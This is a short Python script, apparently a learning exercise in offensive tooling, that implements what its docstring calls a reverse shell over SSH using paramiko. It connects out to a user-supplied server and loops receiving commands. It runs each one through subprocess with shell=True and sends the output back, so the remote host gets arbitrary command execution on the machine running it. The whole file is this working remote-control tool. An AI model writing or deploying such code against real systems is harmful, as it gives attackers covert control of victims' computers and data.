import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    """
    Acts as reverse shell, The client will connect to the server and will send a command, The server will execute
    The command back on the client and the client will accept the command back and execute it from the server with
    subprocess with python, It will run the command subprocess And send it back to the server eventually.
    """
    client = paramiko.SSHClient()
    # auto add host trust policy 
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connects to the server 
    client.connect(ip, port=port, username=user, password=passwd)
    print(f"[debug] connected! ")
    # the ssh session itself
    ssh_session = client.get_transport().open_session()
    print(f"[debug] created ssh session. ")
    # if ssh session enabled we can communicate from the server to the client.
    if ssh_session.active:
        # sending the command
        ssh_session.send(command)
        print(f"[debug] sent data. ")

        # receiving & printing
        print(ssh_session.recv(1024).decode())
        while True:
            # keep receiving the command
            command = ssh_session.recv(1024) 
            try:
                # decoding the command from bytes to utf-8 probably (or ascii)
                cmd = command.decode()
                # if exit that means the connection closed.
                if cmd == 'exit':
                    client.close()
                    break
                # using `check_output` it's like using run, The shlex.split will split the cmd accordingly to shell scripting. 
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) 
                # send the output of the run shell process.
                ssh_session.send(cmd_output or 'okay') 
            except Exception as e:
                ssh_session.send(str(e))
                client.close()
        print(f"[debug] session finished")
    else: 
        print(f"[error] couldn't establish connection")
    return



if __name__ == '__main__':
    import getpass
    print("[debug] check")
    user = input("User: ")
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    ssh_command(ip, port, user, password, 'ClientConnected') 
    